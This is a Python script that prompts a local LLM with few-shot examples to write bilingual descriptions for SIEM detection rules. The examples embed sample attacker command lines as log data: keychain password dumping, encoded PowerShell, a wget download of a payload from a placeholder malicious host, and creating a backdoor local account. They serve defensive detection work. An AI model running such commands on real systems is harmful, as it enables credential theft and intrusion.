import json
import os
import yaml
from pathlib import Path
from typing import Dict, List
import ollama



FEW_SHOT_EXAMPLES = [
    {
        "logs": [
            {
                "subject.account.id": "501",
                "subject.process.fullpath": "/bin/bash",
                "subject.process.name": "bash",
                "object.process.fullpath": "/usr/bin/security",
                "object.process.name": "security",
                "object.process.cmdline": "security find-generic-password -wa Chrome",
                "msgid": "9",
                "event_src.host": "127.0.0.1"
            }
        ],
        "tactic": "Credential Access",
        "technique": "T1555.005: Password Manager",
        "importance": "high",
        "description_en": "The rule detects the receipt of credentials from a browser password store or password chain using the security utility",
        "description_ru": "Правило обнаруживает получение учетных данных из хранилища паролей браузеров или связки паролей с помощью утилиты security",
        "event_descriptions_en": [
            "User {subject.account.id} used {alert.regex_match} command to obtain credentials from keychain using \"security\" utility on host {event_src.host}",
            "User {subject.account.id} used {alert.regex_match} to obtain credentials using the \"security\" utility on host {event_src.host}"
        ],
        "event_descriptions_ru": [
            "Пользователь {subject.account.id} использовал команду {alert.regex_match} для получения учетных данных из связки ключей с помощью утилиты \"security\" на узле {event_src.host}",
            "Пользователь {subject.account.id} использовал команду {alert.regex_match} для получения учетных данных с помощью утилиты \"security\" на узле {event_src.host}"
        ]
    },
    {
        "logs": [
            {
                "subject.account.id": "S-1-5-21-1234567890-1234567890-1234567890-1001",
                "subject.process.fullpath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "subject.process.name": "powershell.exe",
                "subject.process.cmdline": "powershell -enc JABjAGwAaQBlAG4AdAA=",
                "msgid": "1",
                "event_src.host": "WORKSTATION01"
            }
        ],
        "tactic": "Execution",
        "technique": "T1059.001: PowerShell",
        "importance": "high",
        "description_en": "The rule detects execution of PowerShell scripts with encoded commands, commonly used for obfuscation",
        "description_ru": "Правило обнаруживает выполнение скриптов PowerShell с закодированными командами, часто используемыми для обфускации",
        "event_descriptions_en": [
            "User {subject.account.id} executed encoded PowerShell command on host {event_src.host}",
            "Suspicious PowerShell activity detected from {subject.process.fullpath} on host {event_src.host}"
        ],
        "event_descriptions_ru": [
            "Пользователь {subject.account.id} выполнил закодированную команду PowerShell на узле {event_src.host}",
            "Обнаружена подозрительная активность PowerShell из {subject.process.fullpath} на узле {event_src.host}"
        ]
    },
    {
        "logs": [
            {
                "subject.account.id": "root",
                "subject.process.fullpath": "/usr/bin/wget",
                "subject.process.name": "wget",
                "subject.process.cmdline": "wget http://malicious.com/payload.sh",
                "object.fullpath": "/tmp/payload.sh",
                "msgid": "11",
                "event_src.host": "LINUX-SERVER01"
            }
        ],
        "tactic": "Command and Control",
        "technique": "T1105: Ingress Tool Transfer",
        "importance": "medium",
        "description_en": "The rule detects download of files from external sources using command-line utilities",
        "description_ru": "Правило обнаруживает загрузку файлов из внешних источников с помощью утилит командной строки",
        "event_descriptions_en": [
            "File downloaded from external source using {subject.process.name} on host {event_src.host}",
            "User {subject.account.id} transferred file to {object.fullpath} using {subject.process.fullpath}"
        ],
        "event_descriptions_ru": [
            "Файл загружен из внешнего источника с помощью {subject.process.name} на узле {event_src.host}",
            "Пользователь {subject.account.id} передал файл в {object.fullpath} с помощью {subject.process.fullpath}"
        ]
    },
    {
        "logs": [
            {
                "subject.account.id": "admin",
                "subject.process.fullpath": "C:\\Windows\\System32\\cmd.exe",
                "subject.process.name": "cmd.exe",
                "subject.process.cmdline": "cmd /c net user hacker Password123! /add",
                "msgid": "4624",
                "event_src.host": "DC01"
            }
        ],
        "tactic": "Persistence",
        "technique": "T1136.001: Local Account",
        "importance": "high",
        "description_en": "The rule detects creation of local user accounts, potentially for persistence",
        "description_ru": "Правило обнаруживает создание локальных учетных записей пользователей, потенциально для сохранения доступа",
        "event_descriptions_en": [
            "New local account created by {subject.account.id} on host {event_src.host}",
            "User account creation detected via {subject.process.fullpath} on host {event_src.host}"
        ],
        "event_descriptions_ru": [
            "Новая локальная учетная запись создана пользователем {subject.account.id} на узле {event_src.host}",
            "Обнаружено создание учетной записи через {subject.process.fullpath} на узле {event_src.host}"
        ]
    },
    {
        "logs": [
            {
                "subject.account.id": "501",
                "subject.process.fullpath": "/usr/bin/ssh",
                "subject.process.name": "ssh",
                "subject.process.cmdline": "ssh -i /home/user/.ssh/id_rsa admin@192.168.1.100",
                "msgid": "22",
                "event_src.host": "WORKSTATION01"
            }
        ],
        "tactic": "Lateral Movement",
        "technique": "T1021.004: SSH",
        "importance": "medium",
        "description_en": "The rule detects SSH connections to remote hosts, potentially for lateral movement",
        "description_ru": "Правило обнаруживает SSH-подключения к удаленным узлам, потенциально для перемещения внутри сети",
        "event_descriptions_en": [
            "SSH connection established from {subject.account.id} to remote host on {event_src.host}",
            "Remote access via {subject.process.name} detected on host {event_src.host}"
        ],
        "event_descriptions_ru": [
            "SSH-подключение установлено от {subject.account.id} к удаленному узлу на {event_src.host}",
            "Обнаружен удаленный доступ через {subject.process.name} на узле {event_src.host}"
        ]
    }
]


def load_logs_from_correlation(correlation_path: Path) -> List[Dict]:
    """Загружает все нормализованные логи из папки tests."""
    tests_path = correlation_path / "tests"
    logs = []

    if not tests_path.exists():
        return logs

    for file in tests_path.glob("norm_fields_*.json"):
        try:
            with open(file, 'r', encoding='utf-8') as f:
                log_data = json.load(f)
                logs.append(log_data)
        except Exception as e:
            print(f"[!] Ошибка чтения {file}: {e}")

    return logs


def load_answers(correlation_path: Path) -> Dict:
    """Загружает answers.json из папки tests."""

    answers_file = correlation_path / "answers.json"

    if not answers_file.exists():
        return {}

    try:
        with open(answers_file, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception as e:
        print(f"[!] Ошибка чтения answers.json: {e}")
        return {}


def generate_description_prompt(logs: List[Dict], tactic: str, technique: str, 
                                importance: str, examples: List[Dict], lang: str = "en") -> str:
    """Генерирует промпт для LLM с few-shot примерами."""

    lang_config = {
        "en": {
            "role": "You are a cybersecurity analyst specializing in SIEM rule documentation.",
            "task": "Generate a rule description and event descriptions for the following normalized security logs.",
            "output_format": "Output JSON with fields: description (string), event_descriptions (array of 2 strings)",
            "description_hint": "description should be 1-2 sentences explaining what the rule detects",
            "event_hint": "event_descriptions should use placeholders like {{subject.account.id}}, {{subject.process.name}}, {{event_src.host}} for dynamic values",
            "logs_label": "LOGS TO ANALYZE:",
            "context_label": "CONTEXT:",
            "examples_label": "EXAMPLES:"
        },
        "ru": {
            "role": "Вы — аналитик кибербезопасности, специализирующийся на документации правил SIEM.",
            "task": "Сгенерируйте описание правила и описания событий для следующих нормализованных логов безопасности.",
            "output_format": "Выведите JSON с полями: description (строка), event_descriptions (массив из 2 строк)",
            "description_hint": "description должно быть 1-2 предложения, объясняющих что обнаруживает правило",
            "event_hint": "event_descriptions должно использовать плейсхолдеры вида {{subject.account.id}}, {{subject.process.name}}, {{event_src.host}} для динамических значений",
            "logs_label": "ЛОГИ ДЛЯ АНАЛИЗА:",
            "context_label": "КОНТЕКСТ:",
            "examples_label": "ПРИМЕРЫ:"
        }
    }

    cfg = lang_config.get(lang, lang_config["en"])

    examples_text = ""
    for i, ex in enumerate(examples[:5], 1):
        ex_logs = json.dumps(ex["logs"][0] if ex["logs"] else {}, indent=2, ensure_ascii=False)
        examples_text += f"""
        Example {i}:
        {cfg['context_label']} Tactic: {ex['tactic']}, Technique: {ex['technique']}, Importance: {ex['importance']}
        {cfg['logs_label']}
        {ex_logs}
        Output:
        {{
            "description": "{ex[f'description_{lang}']}",
            "event_descriptions": {json.dumps(ex[f'event_descriptions_{lang}'], ensure_ascii=False)}
        }}
        """

        logs_text = "\n".join([json.dumps(log, indent=2, ensure_ascii=False) for log in logs[:10]])

        prompt = f"""<|system|>
        {cfg['role']}
        {cfg['output_format']}.
        {cfg['description_hint']}.
        {cfg['event_hint']}.
        Do not add explanations, only valid JSON.
        <|end|>
        <|user|>
        {cfg['examples_label']}
        {examples_text}

        {cfg['context_label']} Tactic: {tactic}, Technique: {technique}, Importance: {importance}

        {cfg['logs_label']}
        {logs_text}

        Generate description and event_descriptions in {lang.upper()} language.
        Output only valid JSON, no markdown, no explanations.
        <|end|>
        <|assistant|>"""

    return prompt


def generate_descriptions_with_llm(logs: List[Dict], answers: Dict, 
                                   model: str = "qwen2.5:7b-instruct-q4_K_M",
                                   examples: List[Dict] = FEW_SHOT_EXAMPLES) -> Dict:
    """Генерирует описания для логов с помощью LLM для обоих языков."""

    tactic = answers.get("tactic", "Unknown")
    technique = answers.get("technique", "Unknown")
    importance = answers.get("importance", "medium")

    results = {}

    for lang in ["en", "ru"]:
        prompt = generate_description_prompt(logs, tactic, technique, importance, examples, lang)

        try:
            response = ollama.chat(
                model=model,
                messages=[{"role": "user", "content": prompt}],
                options={"temperature": 0.3, "top_p": 0.7, "seed": 42}
            )

            content = response.message.content.strip()

            if content.startswith("```json"):
                content = content[7:-3].strip()
            elif content.startswith("```"):
                content = content[3:-3].strip()

            result = json.loads(content)

            results[lang] = {
                "description": result.get("description", ""),
                "event_descriptions": result.get("event_descriptions", [])
            }

        except Exception as e:
            print(f"[!] Ошибка генерации для {lang}: {e}")
            results[lang] = {
                "description": f"Description for {tactic} - {technique}",
                "event_descriptions": [
                    f"Event detected on {{event_src.host}}",
                    f"User {{subject.account.id}} performed action"
                ]
            }

    return results


def create_i18n_yaml(correlation_path: Path, descriptions: Dict, correlation_id: str):
    """Создает файлы i18n_en.yaml и i18n_ru.yaml."""

    i18n_dir = correlation_path / "i18n"
    i18n_dir.mkdir(exist_ok=True)

    rule_id = f"corrname_{correlation_id}"

    for lang, desc_data in descriptions.items():
        yaml_data = {
            "Description": desc_data["description"],
            "EventDescriptions": [
                {
                    "LocalizationId": f"{rule_id}",
                    "EventDescription": desc_data["event_descriptions"][0] if len(desc_data["event_descriptions"]) > 0 else ""
                },
                {
                    "LocalizationId": f"{rule_id}_2",
                    "EventDescription": desc_data["event_descriptions"][1] if len(desc_data["event_descriptions"]) > 1 else ""
                }
            ]
        }

        yaml_file = i18n_dir / f"i18n_{lang}.yaml"
        with open(yaml_file, 'w', encoding='utf-8') as f:
            yaml.dump(yaml_data, f, allow_unicode=True, default_flow_style=False, sort_keys=False)

        print(f"[+] Создан {yaml_file}")


def process_correlation_folder(correlation_path: Path, correlation_id: str, 
                               model: str = "qwen2.5:7b-instruct-q4_K_M",
                               skip_existing: bool = True):
    """Обрабатывает одну папку correlation_N."""

    i18n_dir = correlation_path / "i18n"
    if skip_existing and i18n_dir.exists() and (i18n_dir / "i18n_en.yaml").exists():
        print(f"[=] Пропущено {correlation_path} (i18n уже существует)")
        return

    print(f"\n[*] Обработка {correlation_path}...")

    logs = load_logs_from_correlation(correlation_path)
    if not logs:
        print(f"[!] Нет логов в {correlation_path}")
        return

    answers = load_answers(correlation_path)
    if not answers:
        print(f"[!] Нет answers.json в {correlation_path}")
        return

    print(f"    Тактика: {answers.get('tactic')}, Техника: {answers.get('technique')}, Важность: {answers.get('importance')}")
    print(f"    Логов: {len(logs)}")

    descriptions = generate_descriptions_with_llm(logs, answers, model)
    create_i18n_yaml(correlation_path, descriptions, correlation_id)


def process_all_correlations(base_path: str, model: str = "qwen2.5:7b-instruct-q4_K_M", 
                            skip_existing: bool = True):
    """Обрабатывает все папки correlation_N в базовой директории."""

    base = Path(base_path)
    if not base.exists():
        print(f"[!] Директория не найдена: {base}")
        return

    correlation_folders = sorted([d for d in base.glob("correlation_*") if d.is_dir()])

    if not correlation_folders:
        print(f"[!] Не найдено папок correlation_* в {base}")
        return

    print(f"[+] Найдено {len(correlation_folders)} папок для обработки")

    for i, corr_path in enumerate(correlation_folders, 1):
        correlation_id = corr_path.name.replace("correlation_", "")
        print(f"\n{'='*60}")
        print(f"[{i}/{len(correlation_folders)}] {corr_path.name}")
        print(f"{'='*60}")

        process_correlation_folder(corr_path, correlation_id, model, skip_existing)

    print(f"\n{'='*60}")
    print(f"[✓] Обработка завершена!")
    print(f"{'='*60}")


if __name__ == "__main__":
    import sys

    default_base_path = os.path.join(Path(__file__).resolve().parent, "windows_correlation_rules")
    base_path = sys.argv[1] if len(sys.argv) > 1 else default_base_path
    model = "qwen2.5:7b-instruct-q4_K_M"

    print(f"[*] База правил: {base_path}")
    print(f"[*] Модель: {model}")
    print(f"[*] Примеров для few-shot: {len(FEW_SHOT_EXAMPLES)} (оптимально 3-5)")

    process_all_correlations(base_path, model, skip_existing=True)
